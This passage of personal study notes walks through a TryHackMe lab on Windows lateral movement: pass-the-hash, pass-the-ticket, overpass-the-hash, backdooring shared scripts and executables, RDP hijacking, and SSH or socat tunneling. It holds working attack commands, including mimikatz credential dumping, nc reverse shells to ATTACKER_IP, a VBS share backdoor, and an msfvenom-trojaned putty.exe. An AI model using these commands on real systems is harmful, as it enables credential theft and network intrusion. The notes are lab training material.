- Interestingly, if you run the `whoami` command on this shell, it will still show you the original user you were using before doing `Pass-the-Hash`, but any command run from here will actually use the credentials we injected using `Pass-the-Hash`.

##### Step 5: Passing the Hash using Linux:
- If you have access to a linux box (like your AttackBox), several tools have built-in support to perform `Pass-The-Hash` using different protocols.
- Depending on which services are available to you, you can do the following:


**Connect to RDP using Pass-the-Hash:**

```bash
$ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```


**Connect via `psexec` using `Pass-the-Hash`**:

```bash
$ psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Note**: Only the linux version of `psexec` support `Pass-the-Hash`.

	- So, we can only use Linux machines when doing Pass-the-Hash attacks when using `psexec` specifically?

**Connect to `WinRM` using `Pass-The-Hash`**:

```bash
$ evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```


## `Kerberos Authentication`

- Let's have a quick look a how Kerberos authentication works on Windows networks:

		1. The user sends his username and timestamp encrypted (Note that only the timestamp seems to be encrypted not the Username) using a key derived from his password to the "Key Distribution Centre(KDC)" , a service usually installed on the Domain Controller in charge of creating Kerberos Tickets on the network. Note that in the request sent by the user, a "Request for TGT" is also included.
		2. The KDC will create and send back a "Ticket Granting Ticket(TGT)" , allowing the user to request tickets to access specific services without passing their credentials to the services themselves. Along with the TGT, a "Session Key" is given to the user, which they will need to generate the requests that follow.

![](/assets/img/Pasted image 20230208165432.png)


	3. When users want to connect to a service on the network like a share, website or database, they will use their "TGT" to ask the KDC for a "Ticket Granting Service(TGS)". TGS are tickets that allow connection only to the specific service for which they were created for. To request a TGS from KDC, the user will send his username and a timestamp encrypted using the "Session Key", along with the TGT and a "Service Principal Name (SPN)" which indicates the service and the server name we intend to access.

	4. As a result, the KDC will send us a TGS and a "Service Session Key", which we will need to authenticate to the service we want to access. The TGS is encrypted using the "Service Owner Hash" by the KDC. The "Service Owner" is the user or machine account under which the service runs. The TGS contains a copy of the "Service Session Key" on its encrypted contents so that the "Service Owner" can access it by decrypting the TGS.

![](/assets/img/Pasted image 20230208171414.png)


	5. The TGS can then be sent to the desired service from the Client's machine to authenticate and establish a connection. At this point, the client's machine and the service will have direct connection without KDC in the middle of them. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session key.

![](/assets/img/Pasted image 20230208171543.png)


### Pass-The-**Ticket** - `Attack on Kerberos Authentication`

- Sometimes it will be possible to ***extract Kerberos tickets and session keys*** from `LSASS memory` using mimikatz.
- The process usually requires us to have `SYSTEM` privileges on the **attacked/compromised machine** and can be done as follows:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Note**: using only a ticket WITHOUT its corresponding session key won't work at all.

- While `mimikatz` can extract any **TGT** or **TGS** available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services that the user is allowed to access.
- At the same time, `TGS`es are only good for a specific service.
- Extracting TGTs will require us to have admin credentials, and extracting `TGS`s can be done with a low-privileged account (only the ones assigned to that account).

##### Injecting tickets into current session
- Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:
```powershell
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

	- How do I know which ticket is TGT or which one is TGS?

- Injecting tickets in our own sessions does NOT require admin privileges.
- After this, the tickets will be available for any tools we use for `lateral movement`.

		- How exactly does this acheive lateral movement? Keep reading the room.

##### Checking for `injected tickets` in current session:
- To check if the tickets were correctly injected, you can use the `klist` command:

```powershell
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```


### Overpass-the-hash / Pass-the-**key**

- This kind of attack is similar to Pass-The-Hash but applied to Kerberos networks.

- When a user requests a TGT, they send a timestamp encrypted with an encryption key derived from their password.
- The algorithm used to derive this key can be either `DES`(disabled by default on current Windows versions), `RC4`, `AES128`, or `AES256`, depending on the installed Windows version and Kerberos configuration.

		- I guess the encryption algorithm for the encrypted timestamp is public knowledge.

- If we have any of those keys, we can ask the `KDC` for a `TGT` without requiring the actual password, hence the name `Pass-the-key(PtK)`.


##### Obtaining Kerberos encryption keys from LSASS memory
- We can obtain the Kerberos encryption keys from memory by using `mimikatz` with the following commands:

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

- Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via `Pass-the-Key`(`nc64` is already available in `THMJMP2` for your convenience).

**If we have the `RC4` hash**:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


**If we have the `AES128` hash**:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


**If we have the `AES256` hash**:

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```


- Notice that when using RC4, the **key will be equal to the NTLM hash** of a user.
- This means that if we could extract the `NTLM hash`, we can use it to request a `TGT` as long as RC4 is one of the enabled protocols.

		- Okay so basically, we have the username and uses the NTLM hash of a user is used as the key when encrypting the Timestamp right before sending the request for TGT.

- This particular variant is usually known as the `Overpass-the-Hash` (OPtH).

##### Receiving the reverse shell on our AttackBox:

```shell
user@AttackBox$ nc -lvp 5556
```

	- Just as with PtH, any command run from this shell will use the credentials injected via mimikatz.


## Application

- To begin this exercise, you will need to connect to THMJMP2 using the following credentials via SSH:

`User:Â ZA.TRYHACKME.COM\t2_felicia.dean`

`Password:Â iLov3THM!`

`ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com`


- These credentials will grant you `administrative access` to `THMJMP2`, allowing you to use `mimikatz` to dump the authentication material needed to perform any of the techniques presented during this task.
- Using your SSH session, use mimikatz to extract authentication materal and **perform `Pass-the-Hash`, `Pass-the-Ticket` AND `Pass-the-Key` against domain user `t1_toby.beck`**.


##### Using `winrs`
- Once you have a command prompt with his credentials loaded, use `winrs` to connect to a command prompt on `THMIIS`.
- Since `t1_toby.beck`'s credentials are already injected in your session as a result of any of the attacks, you can use `winrs` WITHOUT specifying any credentials, and it will use the ones available to your current session:

```powershell
> winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

	- Okay, so basically, this is similar to SSH-ing to the THMIIS machine with the credentials of 't1_toby.beck'

**Question**:
- What makes it possible for us to just use `winrs.exe` to log into the `THMIIS` machine after using the techniques?

**Note**: You'll find a flag on t1_toby.beck's desktop on THMIIS. ***Both*** `mimikatz` and `psexec64` are available at `C:\tools` on THMJMP2.



### Using Pass-The-Hash

	Steps:
	1. Log into the given presumed compromised account "t2_felicia.dean"

![](/assets/img/Pasted image 20230208211705.png)

	2. Enumerate whether NTLM authentication is enabled.
	3. Checking whether we have the correct privilege to do Pass-the-Hash:

```powershell
mimikatz # privilege::debug
```

![](/assets/img/Pasted image 20230208212452.png)

	4. Elevate the access token to NT AUTHORITY\SYSTEM of the current session: 

```powershell
mimikatz # token::elevate

### Using Pass-The-`Key`

	1-4. Same steps as Pass-The-Hash
	- This one is pretty much the same as Pass-the-hash!

-----
# Abusing User Behaviour

- Under certain circumstances, an attacker can take advantage of actions performed by users to gain further access to machines in the network.
- While there are many ways this can happen, we will look at some of the most common ones.


### Abusing `Writable Shares`

- It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments.
- If those shares are `writable` for some reason, an **attacker** can plant specific files to force users into executing any arbitrary payload nad gain access to their machines.

##### Step 1: Executing a binary from a `Network Share`
- One common scenario consists of finding a shortcut to a script or executable file hosted on a network share:

![](/assets/img/Pasted image 20230209091339.png)


- The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine.
- If we, as attackers, have `write` permissions over such **scripts** or **executables**, we can ***backdoor*** them to force users to execute ANY payload we want.


<u>Mechanism</u>: Executing a binary from a network share server

![](/assets/img/Pasted image 20230209092425.png)

	- Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation.
	- Note that the server has the Shared resources and 'binary.exe' is just a placeholder example.

### Backdooring `.vbs` Scripts

- As an example, if the `shared resource` is a ***VBS script***, we can put a copy of `nc64.exe` on the same share and inject the following code in the shared script:

```powershell
> CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip-lateralmovement> 1234", 0, True
```

	- This will copy nc64.exe from the share to the user's workstation "%tmp%" directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

<u>Modelling</u>:

![](/assets/img/Pasted image 20230209093700.png)

	- Note that you can inject the 'nc.exe' command at the end of the found ".VBS" script in the Shared resource using the script just above.


### Backdooring `.exe` Files

- If the shared file is a Windows binary, say `putty.exe`, you can ***download it from the share*** and use `msfvenom` to inject a backdoor into it.
- The binary will still work as usual but execute an additional payload silently.
- To create a backdoored `putty.exe` , we can use the following command:

```bash
$ msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

- The resulting `puttyX.exe` will execute a reverse_tcp meterpreter payload `without` the user noticing it.
- Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the `exploit/multi/handler` module from Metasploit.

		- There are two references for this.
		- One from Sektor7 topic and one from THM using Metasploit to automate backdooring.
		- Pick the one you prefer.


### RDP Hijacking

- When an administrator uses `Remote Desktop` to connect to a machine and ***closes the RDP client instead of logging off***, his session will remain open on the server indefinitely.

		- Always log off your RDP session!

- If you have `SYSTEM` privileges on Windows Server 2016 and earlier, you can take over any existing RDP session **WITHOUT** requiring a password.


- If we have administrator-level access, we can get `SYSTEM` by any method of our preference.
- For now, we will be using `psexec` to do so.
- First, let's run a `cmd.exe` as administrator:

![](/assets/img/Pasted image 20230209094421.png)


- From there, run `PsExec64.exe` (available at `C:\tools\`):

```powershell
> PsExec64.exe -s cmd.exe
```

- To list the existing sessions on a server, you can use the following command:

```cmd
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                      3  Disc            .  4/6/2022 6:51 AM
```

	Breakdown:
	- If we were currently connected via RDP using the administrator user, our SESSIONNAME would be "rdp-tcp#6".
	- We can also see that a user named "luke" has left a session open with "id=3"
	- Any session with a "Disc" state has been left open by the user and isn't being used at the moment.
	- While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.


- To connect to a session, we will use `tscon.exe` and specify the session ID we will be taking over, as well as our current `SESSIONNAME`.

		- tscon.exe is a window feature that connect to another session on a Remote Desktop session Host server.

- Following the previous example, to takeover ***luke***'s session using `tscon.exe` if we were connected as the `administrator` user, we'd use the following command:

```powershell
> tscon 3 /dest:rdp-tcp#6
```

	Breakdown:
	- In simple terms, the command states that the graphical session `3` owned by `luke`, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.


**Note** : Windows Server 2019 won't allow you to connect to another user's session without knowing its password.



## Application

- To complete this exercise, you will need to connect to THMJMP2 using a new set of credentials obtained from `[http://distributor.za.tryhackme.com/creds_t2](http://distributor.za.tryhackme.com/creds_t2) `(**Notice that this link is different from the other tasks**). Once you have your credentials, ***connect to THMJMP2 via RDP***:

```bash
$ xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
```

- These credentials will grant you administrative access to `THMJMP2`.

---------
# Port Forwarding

- Most of the lateral movement techniques we have presented ***require specific ports*** to be available to an attacker.
- In real world networks, the administrators may have `blocked some of these ports` for security reasons or have implemented segmentation around the network, preventing you from reaching

		- SMB
		- RDP
		- WinRM
		- RPC ports

- To go around these restrictions, we can use port forwarding techniques, which consists of using any compromised host as a jump box to pivot to other hosts.
- It is expected that some machines will have more network permissions than others, as every role in a business will have different needs in terms of what network services are required for day-to-day work.


### SSH Tunneling

- The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called **SSH Tunneling**.
- While SSH used to be a protocol associated with Linux systems, Windows now `ships with the OpenSSH` client by default, so you can expect to find it in many systems nowadays, ***independent of their OS***.

- **SSH Tunneling** can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation.
- To explain each case, let's assume a scenario where we've gained control over the `PC-1` machine (it does **NOT** need to be `administrator access`) and would like to use it as a pivot to access a port on another machine to which we **can't** directly connect.
- We will start a tunnel from the `PC-1` machine, acting as an SSH client, to the `Attacker's PC`, which will act as an SSH server.
- The reason to do so is that you'll often find an **SSH client** on Windows machines, but **`no` SSH server** will be available most of the time.

		- Okay, so instead of doing bind connection with SSH, we do reverse connection with SSH instead?
		- Isn't this preferable in general?

<u>Modelling</u>:

![](/assets/img/Pasted image 20230209102832.png)

- Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunneling and set a password to use for creating the tunnels:

<u>AttackBox</u>:

```bash
$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
$ passwd tunneluser
```

	- Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case.


### SSH Remote Port Forwarding

- In our example, let's assume that firewall policies block the attacker's machine from directly accessing port `3389` on the server.
- If the attacker has previously compromised `PC-1` and, in turn, `PC-1` has access to port `3389` of the server, it can be used to pivot to port `3389` using **remote port forwarding** from `PC-1`.
- **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, `PC-1`) and project it into a `remote SSH server` (the attacker's machine).


- As a result, a port will be opened in the attacker's machine that can be used to connect back to port `3389` in the server through the SSH tunnel.
- `PC-1` will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from `PC-1`:

![](/assets/img/Pasted image 20230209103448.png)

	- Note that the port 3389 in the Attacker PC is needed with the created user "tunneluser" because after the SSH Tunnel has been created, we RDP into it and RDP into Linux itself uses port 3389 as well.
	- Notice the modelling shows that Remote Port Forwarding does Bind Connection relative to the Proxy machine. (PC-1(Proxy) -> Server(Target))

**Question**: Why do we need to `port forward` if we have compromised `PC-1` and can run an `RDP` session directly from there? (**Pause and think for a while before looking at the answer**)

	- SSH Tunneling is encrypted? So all commands proxied will be unreadable?
	- If we as the attacker use the compromised machine to RDP to the server, it leaves more trace as it logs the RDP sessions?
	- We as attackers only want to do specific things like executing commands in which SSH tunneling would be more than enough. On the other hand, RDP would give us a lot more options for action to be taken in the server that is NOT needed and is also noisy?

<u>Answer</u>:
- In a situation where we only have console access to `PC-1`, we won't be able to use any RDP client as we don't have GUI. So basically, we presumes that we have restricted way to connect to the server. By making the port available to your attacker's machine, you can use a ***Linux RDP client*** to connect.
- Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.

##### Remote Port Forwarding 3389 to our attacker's machine by executing this command at the compromised machine `PC-1`:

```powershell
C:\> ssh tunneluser@<attacker-ip> -R <local-port>:<remote-IP>:<remote-port> -N
```

```powershell
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

	Breakdown:
	- "tunneluser" : is the user created in the AttackBox to SSH tunnel to the unreachable server through the PC-1 machine proxy.
	- "-N" : Since the "tunneluser" isn't allowed to run a shell on the Attacker PC, we need to run the "SSH" command with the "-N" switch to prevent the client from requesting one, or the connection will exit immediately.
	- "-R" : used to request a remote port forward and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389)

**Note**: The port numbers do NOT need to match, although they do in this example.

- The command itself won't output anything, but the tunnel will depend on the command to be running.
- Whenever we want, we can close the tunnel by pressing `CTRL+C` as with any other command.

##### RDP-ing into the forwarded port in order to reach the Target Server:
- Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

```bash
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```


### SSH Local Port Forwarding

- **Local Port Forwarding** allows us to "`pull`" a port from an SSH server into the SSH client.
- In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on `PC-1`.
- That way, any host(`target`) that can't **connect-back** directly to the attacker's PC but can connect to `PC-1` will now be able to reach the attacker's services through the pivot host.


- Using this type of port forwarding would allow us to run **reverse shells** from hosts (`target`) that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.

<u>Modelling</u>:

![](/assets/img/Pasted image 20230209154702.png)

	- Notice that the target server and PC-1 machine does a reverse connection relative to the PC-1 machine(proxy) instead of a bind connection like in Remote Host Forwarding.
	- Now, Remote Host Forwarding == Bind connection ; Local Port Forwarding == Reverse Connection
	- Both relative to the Proxy/Pivot machine

##### Port forward `port 80` from the attacker's machine and make it available from `PC-1` , we can run the following command on `PC-1`:
<u>Format</u>:

```powershell
C:\> ssh tunneluser@<attacker-IP> -L <target-host-IP>:<proxy-machine-port>:<proxy-machine-localhost>:80 -N
```

<u>Example</u>:

```powershell
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

	Breakdown:
	- "-L" : The command structure is similar to the one used in remote port forwarding but uses the "-L" option for "local port forwarding".
	- This option requires us to indicate the local socket used by PC-1 to receive connections (*:80) and the remote socket to connect to from the attacker's PC perspective (127.0.0.1:80). Basically, any traffic received by the proxy machine(PC-1) will be redirected to the attacker's machine in its port 80.
	- Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker's perspective, that's the host that holds the port 80 to be forwarded.

##### Adding a Firewall Rule at the proxy/pivot machine to allow reverse connection:
- Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with "dir=in"). Administrative privileges are needed for this:

```powershell
PS > netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

		- Note that this is done first BEFORE the ssh connection.

- Once your tunnel is set up, any user pointing their browsers to `PC-1` at `http://2.2.2.2:80` and see the website published by the attacker's machine.


### Port Forwarding with `Socat`

- In situations where SSH is not available, socat can be used to perform similar functionality.
- While not as flexible as `SSH`, **socat** allows you to forward ports in a much simpler way.
- One of the disadvantages of using socat is that we need to ***transfer it to the pivot host*** (`PC-1` in our current example), making it ***more detectable than SSH***, but it might be worth a try where no other option is available.

		- Note that Socat is NOT built-in unlike SSH in most Operating Systems.
		- Okay, so basically we want to transfer Socat on the compromised machine(pivot/proxy machine)??

- The basic syntax to perform port forwarding using `socat` is much simpler.
- If we wanted to open `port 1234` on a host and forward any connection we receive there to `port 4321` on host `1.1.1.1`, you would have the following command:
<u>Format</u>:

```powershell
C:\> socat <protocol-type>:<proxy/pivot-machine-port>,fork <protocol-type>:<target-IP>:<target-port>
```

	- see "fork" description below.

<u>Example</u>:

```powershell
C:\> socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

	Breakdown:
	- "fork" : allows socat to fork a new process for each connection received, making it possible to "handle multiple connections without closing". If you don't include it, socat will close when the first connection made is finished.


- Coming back to our example , if we wanted to access `port 3389` on the server using `PC-1` as a pivot as we did with `SSH remote port forwarding` , we could use the following command:

```powershell
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```


**Note**: `Socat` can't forward the connection directly to the attacker's machine as SSH did but will open a port on `PC-1` that the attacker's machine can then connect to:

![](/assets/img/Pasted image 20230209163052.png)

	- It uses Bind Connection.


##### Creating a firewall rule to open a port at the pivoting machine to allow AttackBox to connect to it:

```powershell
C:\> netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```


- If, on the other hand, we'd like to expose `port 80` from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:

```powershell
C:\> socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

	- Okay, so basically, you are using Socat on TWO machines: one on the pivot machine so that it would forward all received traffic to the target server and then at the AttackBox so that any command sent from AttackBox using Socat will be forwarded in the pivot machine which then forward it again to the target server.
	- So, the traffic gets directed twice.
	- Imagine it connecting two escalators one is a vertical escalator and the other is a horizontal one(or a conveyor belt? Idk).
	- You put the box on the vertical escalator so once it got to the 2nd floor (assuming you were on the 1st floor), the box will then be redirected again laterally using the horizontal escalator.
	- AttackBox connecting to the pivot machine that is on a different network is like going from 1st floor to 2nd floor.
	- Pivot machine sending traffic from itself to the target server that is on the same network is like riding a horizontal escalator on an airport.


<u>Modelling</u>:

![](/assets/img/Pasted image 20230209164050.png)

	- Notice that this one has a lot of setups in comparison with SSH as Socat isn't a built one.


### Dynamic Port Forwarding and SOCKS
- While `single port forwarding` works quite well for tasks that require access to specific sockets, there are times when we might need to ***run scans against many ports of a host***, or even many ports across many machines, ***all through a pivot host***.
- In those cases, `dynamic port forwarding` allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using `SOCKS proxy`.

		- Single port forwarding is a 1-to-1 connection while  Dynamic Port Forwarding seems to have 1-to-Many connections relative to ports (and machines).

##### Reverse Dynamic Port Forwarding:
- Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a **reverse dynamic port forwarding** with the following command:

<u>Format</u>:

```powershell
C:\> ssh <Attackbox-username>@<attacker-ip> -R <pivot-machine-port> -N
```

		- Note that you do this command at the pivoting machine.

<u>Example</u>:

```powershell
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

	- In this case, the SSH server will start a SOCKS proxy on port `9050` and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

- The most interesting part is that we can easily use any of our tools through the `SOCKS` proxy by using **proxychains**.
- To do so, we first need to make sure that `proxychains` is correctly configured to point any connection to the same port used by SSH for the `SOCKS` proxy server.
- The `proxychains configuration file` can be found at `/etc/proxychains.conf` on your **AttackBox**.
- If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for `SOCKS proxying`:

```shell-session
[ProxyList]
socks4  127.0.0.1 9050
```

- The default port is `9050`, but any port will work as long as it matches the one we used when establishing the `SSH tunnel`.
- If we now want to **execute any command `through` the proxy**(`note that it says "through" not "on". This means that this gets executed at the AttackBox passing through the proxy ending up at the target server.`), we can use **proxychains**:

```bash
$ proxychains curl http://pxeboot.za.tryhackme.com
```

	- Note that some software like NMAP might not work well with SOCKS in some circumstances, and might show altered results, so your mileage may vary.
	- Note that we are using SSH at the pivoting machine so the traffic flow is bidirectional. Any traffic going through port 9050 from the AttackBox will go through the pivoting machine and then the pivoting machine does the GET request to the webpage "http://pxeboot.za.tryhackme.com" for us. The response by the Target Server will be sent to the AttackBox the same way.


## Application
- **Note**: Since you will be doing SSH connections from the lab network back to your attacker machine using the `tunneluser` for this task, we highly encourage you to use the `AttackBox`.

- Instructions have been given on creating a user that won't allow running commands or transferring files via SSH/SCP, so be sure to follow them as provided.

- It is also recommended to create a `strong password` for `tunneluser` and make sure it is a unique and discardable password.



- To complete this exercise, you will need to connect to `THMJMP2` using the credentials assign to you in `Task 1` from `http://distributor.za.tryhackme.com/creds`.
- If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to **THMJMP2** via SSH:

```bash
$ ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

![](/assets/img/Pasted image 20230209183327.png)

### 1. SSH Remote Port Forwarding

##### Step 1: Create a separate user in the `AttackBox` for the tunneling:

```bash
$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
$ passwd tunneluser
```

![](/assets/img/Pasted image 20230209190500.png)

<u>This is why we need a new user</u>:

![](/assets/img/Pasted image 20230209190806.png)

##### Step 2: Create the tunnel from the `THMJMP2` to `AttackBox`:

```powershell
C:\> ssh tunneluser@10.50.61.52 -R 8971:THMIIS.za.tryhackme.com:3389 -N
```

	- Note that 3389 in the THMJMP2 has already been assigned to its default RDP service so use another port that won't clash with another user.

![](/assets/img/Pasted image 20230209191028.png)


##### Step 3: Connect to `THMIIS` via `xfreerdp` from `AttackBox` through `THMJMP2`:

```bash
user@AttackBox$ xfreerdp /v:127.0.0.1:8971 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

![](/assets/img/Pasted image 20230209193719.png)

<u>RDP Session using t1_thomas.moore's account</u>:

![](/assets/img/Pasted image 20230209193754.png)

##### NOTE: FOR EACH TECHNIQUE, RESET THE `ATTACKBOX` BECAUSE IT USES DIFFERENT CERTIFICATES WHEN CONNECTING WHICH PREVENTS YOU FROM RDP-ING AGAIN AFTER USING THE PREVIOUS TECHNIQUE.


### 2. SSH Local Port Forwarding

##### Step 1: Create a separate user in the `AttackBox` for the tunneling:

```bash
$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
$ passwd tunneluser
```

![](/assets/img/Pasted image 20230209190500.png)

<u>This is why we need a new user</u>:

![](/assets/img/Pasted image 20230209190806.png)

##### Step 2: Create a firewall rule that allows traffic on port 80 in `THMJMP2`:

```powershell
C:\> netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

![](/assets/img/Pasted image 20230209194424.png)

##### Step 3: Port forwardÂ `port 80`Â from the attacker's machine and make it available fromÂ `PC-1`Â , we can run the following command onÂ `PC-1`:

```powershell
C:\> ssh tunneluser@10.50.61.52 -L *:80:127.0.0.1:80 -N
```

	 - This should be executed at the Pivoting machine which in this case is `THMJMP2`.

**Note**: This is tough to implement because we need user interaction from inside the `THMIIS` to connect to the Attacker's website because any browser related traffic in the `THMDC` will get redirected to `THMJMP2` and then goes to the `AttackBox` which can allow attackers to use `Watering-Hole` attacks which basically infecting users with malware just by visiting a malicious website.

	- Not exactly sure in this but implement anyways!

### 3. Port Forwarding with `Socat` Application

##### Step 1: Connect via RDP to `THMIIS`.

- If we try to connect directly from our ***attacker machine***, we will find that port `3389` has been filtered via a firewall and is therefore not available directly.
- However, the port is up and running but can only be accessed from `THMJMP2`.
- By using `socat`, which is available on `C:\tools\socat` on **THMJMP2**, we will forward the RDP port to make it available on `THMJMP2` to connect from our attacker's machine.
- To do so, we will run `Socat` with the following parameters:

```powershell
C:\tools\socat\> socat TCP4-LISTEN:8971,fork TCP4:THMIIS.za.tryhackme.com:3389
```

- Note that we can't use port `3389` for our listener since it is already being used in `THMJMP2` for its own RDP service.
- Feel free to change the listener port (`13389`) to a different number to avoid clashing with other students.
- In a typical setup, you'd have to add a firewall rule to allow traffic through the listener port, but `THMJMP2` has its ***firewall disabled*** for your convenience.

```powershell
C:\> netsh advfirewall firewall add rule name="Open Port 8971" dir=in action=allow protocol=TCP localport=8971
```

	- Note that you need administrative access to execute this command:

![](/assets/img/Pasted image 20230209184134.png)

	- Also, t2_tony.holland seems to have deelevated access token from the UAC protection mechanism which adding a firewall rule difficult for us.
	- Note that there is no need for firewall rule adding in this case as we are doing bind connection relative to the pivoting machine.

- Once the listener has been set up, you should be able to connect to `THMIIS` via **RDP** from your `Attacker machine` by pivoting through your `Socat` listener at **THMJMP2**:

```bash
user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:8971 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

	- The assumption is that we compromised the credentials of user "t1_thomas.moore".

<u>Output</u>:

![](/assets/img/Pasted image 20230209185445.png)

##### Goal:
- Once connected, you should get a flag from ***t1_thomas.moore***'s desktop on `THMIIS`.

![](/assets/img/Pasted image 20230209185539.png)


### 4. Dynamic Port Forwarding and SOCKS

-  Just see NMAP with proxychains for implementation of this!


## Tunneling Complex Exploits

- The `THMDC` server is running a vulnerable version of `Rejetto HFS`.
- The problem we face is that firewall rules restrict access to the vulnerable port so that it can only be viewed from `THMJMP2`.

###### NOTE:
- Furthermore, outbound connections from `THMDC` are **only allowed machines in its local network**, making it impossible to receive a reverse shell directly to our attacker's machine.


- To make things worse, the `Rejetto HFS` exploit requires the attacker to host an `HTTP` server to trigger the final payload, but since no outbound connections are allowed to the attacker's machine, we would need to find a way to host a web server in one of the other machines in the same network BEFORE going to our machine, which is not at all convenient.
- We can use `port forwarding` to overcome all of these problems.


- First, let's take a look at how the exploit works.

##### Steps:
`1.` Connect to the ***HFS port*** (`RPORT` in Metasploit) to trigger a second connection.

`2.` This second connection will be made against the attacker's machine on "`SRVPORT`", where a web server from the `Attacker PC`  will deliver the final payload to the `THMDC`. Notice that it is the `THMDC` is the one that makes the request to the `Attacker PC`. Also note that due to the restriction, the pivoting machine is abstracted in here.

`3.` Finally, the attacker's payload will execute and send back a reverse shell to the attacker on `LPORT`:

![](/assets/img/Pasted image 20230209174656.png)


- With this in mind, we could use `SSH` to forward some ports from the attacker's machine to `THMJMP2` (**SRVPORT** for the web server and **LPORT** to receive the reverse shell) and pivot through the `THMJMP2` to reach **RPORT** on `THMDC`.
- We would need to do three port forwards in both directions so that all the exploit's interactions can be proxied through `THMJMP2`:

	- 1 : Triggers the exploit
	- 2 : Request the payload via HTTP
	- 3 : Send Reverse shell to attacker since it executes the requested payload.


